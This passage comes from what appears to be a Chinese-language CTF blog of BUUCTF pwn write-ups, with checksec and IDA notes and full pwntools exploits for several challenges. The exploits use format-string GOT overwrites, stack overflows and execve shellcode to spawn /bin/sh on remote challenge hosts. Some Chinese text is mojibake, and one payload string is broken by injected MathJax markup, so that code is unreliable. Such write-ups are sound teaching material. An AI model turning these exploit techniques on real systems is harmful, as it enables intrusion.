class="hljs-number">0x19c</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x198</span>+p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>gdb.attach(p)<br>Dis(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>, free_addr)<br>libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>Upd(<span class="hljs-number">1</span>, <span class="hljs-number">0x4</span>, p32(sys_addr))<br>Del(<span class="hljs-number">2</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="äº”ã€axb-2019-fmt32"><a href="#äº”ã€axb-2019-fmt32" class="headerlink" title="äº”ã€axb_2019_fmt32"></a>äº”ã€axb_2019_fmt32</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210824223244646.png" alt="image-20210824223244646"></p><p>æƒ¯ä¾‹checksecï¼Œ32ä½ï¼Œå¼€äº†NX</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225801805.png" alt="image-20210824225801805"></p><p>IDAé‡Œé¢å¾ˆæ˜æ˜¾çš„å°±æ˜¯ç»™äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œé¢˜ç›®ä¹Ÿæš—ç¤ºäº†ã€‚ä½†æ˜¯ç”±äºç¨‹åºå†…å¾ˆå¹²å‡€ï¼Œæ²¡æœ‰ä»€ä¹ˆå…¶ä»–å‡½æ•°ï¼Œé‚£è¦getshellï¼Œå°±å¾—å…ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²å‡ºlibcï¼Œå†å€Ÿç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™åˆ°æ ˆä¸Šï¼Œæˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œæ ˆè¿˜è¦å†æ³„éœ²å‡ºæ ˆåœ°å€ï¼Œä¹Ÿå¯ä»¥å®ç°ï¼ˆå› ä¸ºæœ‰ä¸ªå‡½æ•°environå°±æ˜¯å­˜äº†æ ˆåœ°å€çš„ï¼‰ï¼Œæ‰€ä»¥è¿™è¾¹æˆ‘è½¬å¿µæƒ³åˆ°åŠ«æŒgotè¡¨å°±ä¸è¦è¿™ä¹ˆéº»çƒ¦ï¼Œgotåœ°å€åˆæ˜¯ç›´æ¥å·²çŸ¥çš„</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225741699.png" alt="image-20210824225741699"></p><p>ç„¶åå…ˆè®¡ç®—åç§»ï¼Œè¿™è¾¹å¯ä»¥çœ‹è§ï¼Œæˆ‘æ˜¯è¾“å…¥äº†4ä¸ªaçš„ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾æ˜¯æ²¡æœ‰å¯¹é½çš„ï¼Œæ‰€ä»¥ä¹‹åå†™payloadçš„æ—¶å€™ï¼Œè¦å…ˆè¡¥é½ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„åç§»ä»ç¬¬å…«ä¸ªå¼€å§‹</p><p>ç„¶åè¿™é¢˜æ˜¯æœ‰é™æ—¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨%x$nçš„æ—¶å€™ï¼Œåˆ†ä¸¤æ¬¡åŠ«æŒï¼Œå†™æˆhnï¼ˆå¦‚æœhnä¹Ÿè¶…æ—¶ï¼Œé‚£å°±hhnï¼‰ï¼Œè¿™æ ·è¾“å…¥æ›´å¿«æ·ã€‚ä¸ç„¶ä¼štimeout</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210825001757873.png" alt="image-20210825001757873"></p><p>æœ€åå°±æ˜¯é€‰æ‹©åŠ«æŒstrlenï¼Œåˆšå¼€å§‹æ˜¯åŠ«æŒprintfçš„ï¼Œä½†æ˜¯å¯èƒ½æ˜¯å› ä¸ºåœ¨ä¹‹å‰æœ‰ä¸ªåœ°æ–¹å·²ç»è°ƒç”¨äº†printfæ‰“å°ä¸€å¥è¯å¯¼è‡´å‡ºé”™ï¼Œç„¶åè¿™è¾¹åŠ«æŒçš„æ—¶å€™ï¼Œè¦åœ¨/bin/shå‰åŠ ä¸Šåˆ†å·ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹å‰é¢å…¶å®å·²ç»æœ‰ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦åˆ†éš”å¼€ï¼Œæ‰èƒ½è¯†åˆ«å‡º/bin/sh</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210825002000682.png" alt="image-20210825002000682"></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27607</span>)<br><span class="hljs-comment">#p = process(&#x27;./axb_2019_fmt32&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./axb_2019_fmt32&quot;</span>)<br>printf_got = elf.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>strlen_got = elf.got[<span class="hljs-string">&quot;strlen&quot;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(printf_got) + <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-string">&quot;%8$s&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;xxxx&quot;</span>)<br>printf = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(printf))<br>sys = printf - <span class="hljs-number">0xe6e0</span><br>sys_high = (sys &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span><br>sys_low =  (sys) &amp; <span class="hljs-number">0xFFFF</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sys--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;low--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_low))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;high--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_high))<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(strlen_got) + p32(strlen_got+<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(sys_low - <span class="hljs-number">18</span>) + <span class="hljs-string">&quot;c%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="7.679ex" height="2.676ex" style="vertical-align: -0.505ex;" viewbox="0 -934.9 3306.4 1152.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title"><title id="MathJax-SVG-1-Title">hn" + '%' +str(sys_high - sys_low) +"c%9</title><defs aria-hidden="true"><path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/><path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/><path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/><path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/><path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true"> <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/> <use xlink:href="#E1-MJMATHI-6E" x="576" y="0"/> <use xlink:href="#E1-MJMAIN-22" x="1454" y="0"/><g transform="translate(2233,0)"> <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/> <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/></g></g></svg>hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload= <span class="hljs-string">&quot;;/bin/sh\x00&quot;</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="å…­ã€bbys-tu-2016"><a href="#å…­ã€bbys-tu-2016" class="headerlink" title="å…­ã€bbys_tu_2016"></a>å…­ã€bbys_tu_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151052237.png" alt="image-20210826151052237"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€äº†NX</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151038100.png" alt="image-20210826151038100"></p><p>è¿›å…¥IDAï¼Œå‘ç°æœ‰ä¸ªåé—¨å‡½æ•°ï¼Œå¹¶ä¸”ä¸»å‡½æ•°ååˆ†ç®€å•ï¼Œå°±ç»™äº†ä¸ªå¾ˆæ˜æ˜¾çš„æº¢å‡ºï¼Œé‚£å°±ç›´æ¥è·³è½¬åˆ°åé—¨å‡½æ•°å³å¯</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826150923013.png" alt="image-20210826150923013"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151009378.png" alt="image-20210826151009378"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151024405.png" alt="image-20210826151024405"></p><p>è¿™è¾¹å°±æ˜¯IDAé‡Œé¢çš„æº¢å‡ºä¸å¯¹ï¼Œæ‰€ä»¥è¦å»gdbé‡Œé¢åŠ¨æ€è°ƒè¯•è®¡ç®—åç§»æ‰è¡Œ</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151210436.png" alt="image-20210826151210436"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27835</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x804856D</span>)<br>p.sendline(payload) <br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ä¸ƒã€pwnable-start"><a href="#ä¸ƒã€pwnable-start" class="headerlink" title="ä¸ƒã€pwnable_start"></a>ä¸ƒã€pwnable_start</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151445256.png" alt="image-20210826151445256"></p><p>å¸¸è§„checksecï¼Œ32ä½ï¼Œä»€ä¹ˆä¿æŠ¤éƒ½æ²¡å¼€</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151616994.png" alt="image-20210826151616994"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151627593.png" alt="image-20210826151627593"></p><p>è¿›å…¥IDAï¼Œåªå­˜åœ¨startï¼Œå¹¶æ²¡æœ‰mainå‡½æ•°ï¼Œåªèƒ½çœ‹æ±‡ç¼–</p><p>é€šè¿‡ç›´æ¥çœ‹æ±‡ç¼–ï¼Œæˆ–è€…è¿›è¡Œgdbè°ƒè¯•ï¼Œéƒ½èƒ½è·å¾—è¾“å…¥ç‚¹è·ç¦»è¿”å›åœ°å€é•¿åº¦ä¸º0x14</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826165108914.png" alt="image-20210826165108914"></p><p>åœ¨gdbé‡Œé¢å¯ä»¥å‘ç°ï¼Œå½“æ‰§è¡Œåˆ°retï¼ŒespæŒ‡å‘çš„åœ°æ–¹å­˜ç€ä¸€ä¸ªæ ˆä¸Šçš„åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥æ®æ­¤ï¼Œæˆ‘ä»¬å…ˆè·³è½¬åˆ°wirteå‡½æ•°ï¼ŒæŠŠespæŒ‡å‘çš„åœ°æ–¹è¾“å‡ºå‡ºæ¥ï¼Œä»è€Œè·å¾—æ ˆä¸Šåœ°å€ã€‚</p><p>ç„¶åï¼Œå› ä¸ºè·³è½¬ç¨‹åºï¼ŒåŒæ ·ä¼šå†æ¬¡æ‰§è¡Œreadï¼Œæ­¤æ—¶æˆ‘ä»¬è¾“å…¥çš„æ ˆåœ°å€æ¯”æˆ‘ä»¬æ³„éœ²çš„æ ˆåœ°å€åˆšå¥½å°‘4ä¸ªå­—èŠ‚ï¼Œå› ä¸ºæœ€åéƒ½ä¼šæ‰§è¡Œåˆ°add esp,0x14ï¼Œæ‰€ä»¥åç§»ä»ç„¶æ˜¯0x14ï¼Œå†è§£é‡Šä¸‹ä¸ºä»€ä¹ˆespè·ç¦»æˆ‘ä»¬å†™å…¥çš„/bin/sh\x00ä¼šå·®0x18ï¼Œæ˜¯å› ä¸ºæ‰§è¡Œretæ—¶ï¼Œä¼šæ‰§è¡Œpopï¼Œæ‰€ä»¥ä¼šå¤š4ä¸ªå­—èŠ‚</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826173800838.png" alt="image-20210826173800838"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26799</span>)<br><span class="hljs-comment">#p = process(&#x27;./start&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;CTF:&quot;</span>)<br>shellcode = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)<br>p.send(shellcode)<br>addr = u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-built_in">hex</span>(addr))<br><br>shellcode = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">8</span>) +p32(addr+<span class="hljs-number">0x14</span>)<br>shellcode += asm(<span class="hljs-string">&quot;lea ebx,[esp-0x18]&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;mov eax,0xb&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor ecx,ecx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor edx,edx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;int 0x80&quot;</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="å…«ã€picoctf-2018-echo-back"><a href="#å…«ã€picoctf-2018-echo-back" class="headerlink" title="å…«ã€picoctf_2018_echo_back"></a>å…«ã€picoctf_2018_echo_back</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182247503.png" alt="image-20210826182247503"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€äº†NXã€Canary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182506261.png" alt="image-20210826182506261"></p><p>è¿›å…¥IDAï¼Œå¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè·Ÿè¿™ç¯‡æ–‡ç« çš„ç¬¬äº”é¢˜æ¯”è¾ƒç›¸ä¼¼ã€‚ä½†æ˜¯å°‘äº†å¾ªç¯ï¼Œå¤šäº†systemå‡½æ•°è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åŠ«æŒgotè¡¨æ—¶éœ€è¦è®©ç¨‹åºèƒ½å†æ‰§è¡Œä¸€æ¬¡vulnå‡½æ•°ï¼Œè®©æˆ‘ä»¬èƒ½è¾“å…¥/bin/sh\x00ï¼Œä¸éœ€è¦æ³„éœ²libcåŸºå€</p><p>å› ä¸ºåé¢æœ‰æ‰§è¡Œputså‡½æ•°ï¼Œé‚£å¯ä»¥æŠŠputsçš„gotè¡¨ä¿®æ”¹ä¸ºvulnå‡½æ•°çš„èµ·å§‹åœ°å€</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826191303201.png" alt="image-20210826191303201"></p><p>åç§»æ˜¯7</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826184836372.png" alt="image-20210826184836372"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27830</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804A010</span><br>sys_plt = <span class="hljs-number">0x08048460</span><br>puts_got = <span class="hljs-number">0x0804A01C</span><br>vuln = <span class="hljs-number">0x080485AB</span><br><br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(puts_got+<span class="hljs-number">2</span>) + p32(printf_got) + p32(puts_got) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%8$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8460</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%9$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85AB</span>-<span class="hljs-number">0x8460</span>) + <span class="hljs-string">&quot;c%10$hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="ä¹ã€ciscn-2019-sw-1"><a href="#ä¹ã€ciscn-2019-sw-1" class="headerlink" title="ä¹ã€ciscn_2019_sw_1"></a>ä¹ã€ciscn_2019_sw_1</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194736365.png" alt="image-20210826194736365"></p><p>å¸¸è§„checksecï¼Œ32ä½ï¼Œå¼€äº†NX</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194146179.png" alt="image-20210826194146179"></p><p>è¿›å…¥IDAï¼Œè¿™é¢˜ä¹Ÿæ˜¯ä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè€Œä¸”ä»”ç»†çœ‹ï¼Œè·Ÿç¬¬å…«é¢˜å‡ ä¹ä¸€æ ·ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å­˜åœ¨è°ƒç”¨äº†systemå‡½æ•°ï¼Œä¸éœ€è¦æ³„éœ²</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826195039322.png" alt="image-20210826195039322"></p><p>åç§»ä¸º4</p><p>è¿™è¾¹å› ä¸ºprintfåç»­ä¹Ÿæ²¡åˆ«çš„å‡½æ•°ï¼Œæ‰€ä»¥è¦è®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡å°±è¦å»æ‰¾åœ¨printfä¹‹åï¼Œç¨‹åºè¿˜è°ƒç”¨äº†ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åå»æŠŠè¿™ä¸ªä¿®æ”¹ä¸ºmainå‡½æ•°åœ°å€</p><p>linuxä¸­åœ¨ç¨‹åºç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨<code>fini.array</code>ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚æ‰€ä»¥è¿™è¾¹æŠŠfini.arrayä¸­çš„å‡½æ•°æŒ‡é’ˆæ”¹å†™ä¸ºmainå‡½æ•°åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27862</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804989C</span><br>system_plt = <span class="hljs-number">0x080483D0</span><br>fini = <span class="hljs-number">0x0804979C</span><br>main = <span class="hljs-number">0x8048534</span><br><br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(fini+<span class="hljs-number">2</span>) + p32(printf_got) + p32(fini) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%4$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%5$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x83D0</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%6$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8534</span>-<span class="hljs-number">0x83D0</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="åã€cmcc-pwnme2"><a href="#åã€cmcc-pwnme2" class="headerlink" title="åã€cmcc_pwnme2"></a>åã€cmcc_pwnme2</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143550209.png" alt="image-20210827143550209"></p><p>å¸¸è§„checksecï¼Œ32ä½ï¼Œå¼€å¯NX</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145058312.png" alt="image-20210827145058312"></p><p>è¿›å…¥IDAï¼Œç¨‹åºå­˜åœ¨æ˜æ˜¾æº¢å‡ºï¼Œç„¶åå­˜åœ¨è¿™ä¸ªåé—¨å‡½æ•°å¯ä»¥æ‰“å°flagï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åªéœ€è¦è®©stringé‡Œé¢æ”¾ç€çš„æ˜¯flagå³å¯è·³è½¬åˆ°è¿™è·å¾—flagã€‚</p><p>æ‰€ä»¥å…ˆæº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œåœ¨è¿”å›åœ°å€å¡«ä¸Šè¾“å…¥å‡½æ•°getsï¼Œå¾€stringé‡Œé¢å†™å…¥flag</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145907550.png" alt="image-20210827145907550"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26117</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span 